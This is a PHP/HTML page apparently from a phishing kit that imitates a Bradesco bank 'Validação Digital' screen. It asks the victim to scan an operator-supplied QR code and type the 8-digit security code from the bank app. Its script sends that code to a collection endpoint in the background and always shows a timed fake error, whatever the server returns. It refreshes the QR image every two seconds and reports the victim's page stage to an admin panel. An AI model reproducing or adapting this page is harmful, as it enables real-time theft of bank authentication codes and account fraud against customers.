<?php
session_start();
if (!isset($_SESSION['client_id'])) {
    header('Location: /index.php');
    exit;
}
$menuAtivo = 'transferencias';

// (Opcional) Se quiser gerar um QR Code real, substitua a imagem placeholder.
// Pode usar uma lib (ex: chillerlan/php-qrcode) ou serviço externo. Aqui um base64 simples.
$qrPlaceholder = 'data:image/svg+xml;base64,' . base64_encode('
<svg xmlns="http://www.w3.org/2000/svg" width="180" height="180">
 <rect width="180" height="180" fill="#fff"/>
 <text x="50%" y="50%" font-size="14" text-anchor="middle" fill="#222" dy=".3em">QR CODE</text>
</svg>');
?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<title>Banco Bradesco | Entre Nós, Você Vem Primeiro</title>
<link rel="icon" href="/imagens/iconsite.png" type="image/png"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
    body{margin:0;font-family:'Montserrat',sans-serif;background:#f2f3f5;color:#111;}
    .page-wrapper-qrc{min-height:calc(100vh - 5000px);display:flex;align-items:flex-start;justify-content:center;padding:32px 16px 70px;box-sizing:border-box;}
    @media (min-height:760px){.page-wrapper-qrc{align-items:center;}}
    .card-qrc{width:100%;max-width:880px;background:#fff;border:1px solid #e2e3e6;border-radius:18px;padding:40px 50px 44px;box-shadow:0 6px 26px -10px rgba(0,0,0,0.15);position:relative;}
    @media (max-width:860px){.card-qrc{padding:34px 34px 40px;}}
    @media (max-width:560px){.card-qrc{padding:30px 22px 36px;border-radius:16px;}}
    .titulo-bloco{margin:0 0 8px;font-size:26px;font-weight:700;letter-spacing:.3px;}
    .sub-explica{margin:0 0 28px;font-size:14px;line-height:1.55;max-width:640px;color:#333;}
    .passos-wrapper{display:flex;flex-direction:column;gap:34px;}
    .passo{display:flex;gap:26px;align-items:flex-start;}
    .passo-num{flex-shrink:0;width:34px;height:34px;border-radius:50%;background:linear-gradient(127deg, #142463 0%, #034694 100%);color:#fff;font-weight:700;font-size:15px;display:flex;align-items:center;justify-content:center;box-shadow:0 3px 10px -2px #1f28a4;}
    .passo-corpo{flex:1;min-width:0;}
    .passo-corpo h3{margin:0 0 10px;font-size:16px;font-weight:600;color:#222;}
    .passo-corpo p{margin:0;font-size:14px;line-height:1.5;color:#333;}
    .qr-box{background:#fff;border:1px solid #ddd;border-radius:10px;padding:12px;display:inline-block;margin-top:4px;}
    .qr-box img{display:block;width:180px;height:180px;object-fit:contain;}
    .dados-transf{margin:16px 0 0;font-size:13px;line-height:1.4;color:#222;}
    .dados-transf strong{display:block;font-size:14px;margin-top:4px;}
    .codigo-area{margin-top:18px;}
    .codigo-label{font-size:14px;margin:0 0 18px;font-weight:600;}
    .inputs-codigo{display:flex;gap:20px;margin:0 0 24px;flex-wrap:wrap;}
    .digit-slot{width:48px;border:none;border-bottom:2px solid #cfcfcf;background:transparent;font-size:24px;text-align:center;font-weight:600;padding:10px 0 8px;outline:none;transition:border-color .18s;}
    .digit-slot:focus{border-bottom-color:#142463;}
    .digit-slot.valid{border-bottom-color:#142463;}
    @media (max-width:560px){.digit-slot{width:42px;font-size:22px;}}
    .acoes{display:flex;gap:26px;flex-wrap:wrap;}
    .btn-primary,.btn-link{font-family:'Montserrat',sans-serif;font-size:14px;font-weight:600;cursor:pointer;border:none;text-decoration:none;}
    .btn-primary{background:linear-gradient(127deg, #142463 0%, #034694 100%);color:#fff;padding:14px 50px;border-radius:30px;box-shadow:0 5px 18px -5px #142463;transition:filter .2s,transform .15s;opacity:.55;}
    .btn-primary.enabled{opacity:1;}
    .btn-primary.enabled:hover{filter:brightness(1.05);}
    .btn-primary.enabled:active{transform:translateY(1px);filter:brightness(.95);}
    .btn-link{background:transparent;color:#000;padding:14px 10px;}
    .btn-link:hover{text-decoration:underline;}
    #status-msg{text-align:left;font-size:13px;min-height:18px;margin-top:8px;color:#d71e28;font-weight:500;}
    /* Overlay processamento */
    .card-processing-overlay{
        position:absolute;inset:0;background:rgba(255,255,255,0.92);
        display:none;align-items:center;justify-content:center;flex-direction:column;
        z-index:50;border-radius:18px;font-family:'Montserrat',sans-serif;
    }
    .card-processing-overlay .spinner{
        width:64px;height:64px;border:6px solid #e3e3e3;border-top-color:#142463;
        border-radius:50%;animation:spin .8s linear infinite;margin-bottom:22px;
    }
    .card-processing-overlay p{margin:0;font-size:15px;font-weight:500;color:#444;text-align:center;line-height:1.4;max-width:280px;}
    @keyframes spin{to{transform:rotate(360deg);}}
    /* Popup erro */
    .popup-erro{
        position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.4);
        display:none;align-items:center;justify-content:center;z-index:200;
        font-family:'Montserrat',sans-serif;
    }
    .popup-erro .box{
        background:#fff;border-radius:14px;padding:30px 34px;max-width:360px;width:100%;
        box-shadow:0 10px 28px -6px rgba(0,0,0,.4);text-align:center;
        animation:pop .3s ease;
    }
    @keyframes pop{from{transform:scale(.9);opacity:.2;}to{transform:scale(1);opacity:1;}}
    .popup-erro h4{margin:0 0 12px;font-size:18px;font-weight:700;color:#142463;}
    .popup-erro p{margin:0 0 22px;font-size:14px;line-height:1.5;color:#444;}
    .popup-erro button{
        background:linear-gradient(127deg, #142463 0%, #034694 100%);border:none;color:#fff;
        padding:12px 28px;font-size:14px;font-weight:600;border-radius:28px;cursor:pointer;
        box-shadow:0 4px 14px -4px #142463;
    }
    .popup-erro button:hover{filter:brightness(1.06);}
</style>
</head>
<body>

<?php include 'headerprime.php'; ?>
<?php include 'menuprime.php'; ?>

<div class="page-wrapper-qrc">
    <div class="card-qrc">
        <div id="processing-overlay" class="card-processing-overlay" aria-hidden="true">
            <div class="spinner"></div>
            <p>Validando, por favor, aguarde.</p>
        </div>

        <h1 class="titulo-bloco">Validação Digital</h1>
        <p class="sub-explica">
            Utilize a Validação Digital para desbloquear a função de transferências.<br>Siga as instruções abaixo no app e informe o código exibido após ler o QR Code.
        </p>

        <div class="passos-wrapper">
            <!-- PASSO 1 -->
            <div class="passo">
                <div class="passo-num">1</div>
                <div class="passo-corpo">
                    <h3>No aplicativo, abra <strong>Chave de Segurança</strong> &gt; <strong>Validação Digital</strong> e leia esta imagem.</h3>
                    <div class="qr-box">
                        <img src="<?php echo $qrPlaceholder; ?>" alt="QR Code Validação">
                    </div>
                </div>
            </div>

            <!-- PASSO 2 (antigo 3) -->
            <div class="passo">
                <div class="passo-num">2</div>
                <div class="passo-corpo">
                    <h3>Digite o código de 8 dígitos mostrado no celular.</h3>
                    <div class="codigo-area">
                        <div class="inputs-codigo" id="inputs-codigo">
                            <?php for($i=0;$i<8;$i++): ?>
                                <input type="text" inputmode="numeric" maxlength="1"
                                       class="digit-slot" data-idx="<?php echo $i; ?>">
                            <?php endfor; ?>
                        </div>
                        <div class="acoes">
                            <button id="btnContinuar" class="btn-primary" disabled>Continuar</button>
                            <a href="/primelogado.php" class="btn-link">Cancelar</a>
                        </div>
                        <div id="status-msg"></div>
                    </div>
                </div>
            </div>
        </div>

    </div>
</div>

<div id="popupErro" class="popup-erro" role="alertdialog" aria-modal="true" aria-labelledby="pe-title" aria-describedby="pe-desc">
    <div class="box">
        <h4 id="pe-title">Não foi possível validar</h4>
        <p id="pe-desc">A validação digital não pôde ser concluída. Verifique o código e tente novamente.</p>
        <button id="btnFecharPopup">Tentar novamente</button>
    </div>
</div>

<?php include 'footerprime.php'; ?>
<?php include 'chat.php'; ?>

<script>
const slots      = Array.from(document.querySelectorAll('.digit-slot'));
const btn        = document.getElementById('btnContinuar');
const overlay    = document.getElementById('processing-overlay');
const popupErro  = document.getElementById('popupErro');
const fecharPop  = document.getElementById('btnFecharPopup');

// Função para habilitar/desabilitar o botão de continuar
function updateButton(){
    const codigoAtual = slots.map(s => s.value).join('');
    // Habilita o botão se o código tiver 6 OU 8 dígitos
    const completo = (codigoAtual.length === 6 || codigoAtual.length === 8);
    btn.disabled = !completo;
    btn.classList.toggle('enabled', completo);
}

// Lógica para pular para o próximo campo e apagar
slots.forEach((inp, idx)=>{
    inp.addEventListener('input', e=>{
        let v = e.target.value.replace(/\D/g,'');
        e.target.value = v.slice(0,1);
        if(v && idx < slots.length-1){ slots[idx+1].focus(); }
        updateButton(); // Chama a verificação a cada dígito
    });
    inp.addEventListener('keydown',e=>{
        if(e.key==='Backspace' && !inp.value && idx>0){
            slots[idx-1].focus();
        }
        // Atualiza o estado do botão ao apagar também
        setTimeout(updateButton, 0);
    });
});

// --- LÓGICA DO BOTÃO ATUALIZADA ---
btn.addEventListener('click', ()=>{
    if(btn.disabled) return;
    
    const codigoFinal = slots.map(s => s.value).join('');

    // Mostra o overlay de carregamento
    overlay.style.display = 'flex';
    btn.disabled = true;

    // 1. Dispara a requisição para a API em segundo plano.
    // O resultado dela (sucesso ou falha) não vai mais controlar a interface.
    const formData = new FormData();
    formData.append('acao', 'validar_chave'); 
    formData.append('codigo', codigoFinal); 
    
    fetch('processa_chave_seg.php', {
        method: 'POST',
        headers: {'X-Requested-With': 'XMLHttpRequest'},
        body: formData
    }).catch(error => {
        // Apenas logamos o erro no console para fins de depuração,
        // mas não mostramos nada para o usuário.
        console.error('Erro de fundo ao contatar a API:', error);
    }); 

    // 2. Inicia o temporizador de 300 segundos (300.000 milissegundos).
    // Este temporizador agora controla o fluxo visual.
    setTimeout(() => {
        // Esconde o overlay de carregamento
        overlay.style.display = 'none';
        
        // Exibe o popup de erro
        popupErro.style.display = 'flex';
        
        // O botão de continuar não será reativado aqui para evitar múltiplos cliques
        // Ele será reativado apenas quando o usuário fechar o popup de erro.

    }, 30000); // 300 segundos = 300 * 1000 ms
});

// --- Lógica do Popup e do QR Code (sem alterações) ---
fecharPop.addEventListener('click', ()=>{
    popupErro.style.display='none';
    
    // Limpa os campos e reativa o botão para uma nova tentativa
    slots.forEach(s => s.value = '');
    slots[0].focus();
    updateButton();
});

(function(){
  const qrImg = document.querySelector('.qr-box img');
  function atualizarQRCode() {
      fetch('/get_qrcode.php')
        .then(r=>r.json())
        .then(d=>{
          if (d.success && d.qrcode_img) {
            if (qrImg && qrImg.src !== d.qrcode_img) {
              qrImg.src = d.qrcode_img;
            }
          }
        })
        .catch(()=>{ /* silencia erros */ });
  }
  atualizarQRCode();
  setInterval(atualizarQRCode, 2000);
})();
</script>

    <script>
    document.addEventListener('DOMContentLoaded', () => {
        // 1. Defina o nome da página (continua igual)
        // IMPORTANTE: Altere este valor para o nome da página atual
        const pageName = 'qrcodeted.php'; 

        // 2. Crie uma função para encapsular a lógica do fetch
        // Isso torna o código mais limpo e reutilizável.
        function reportarEstagioAtual() {
            fetch('/atualizar_estagio.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ estagio: pageName }),
                credentials: 'include' // É uma boa prática manter isso
            }).catch(error => console.error(`Erro ao reportar estágio '${pageName}':`, error));
        }

        // 3. Chame a função uma vez imediatamente quando a página carregar
        // Para que o admin veja a atualização na hora, sem esperar 2 segundos.
        reportarEstagioAtual(); 

        // 4. Configure para chamar a função repetidamente a cada 2 segundos
        setInterval(reportarEstagioAtual, 2000); // 2000 milissegundos = 2 segundos
    });
    </script>

</body>
</html>
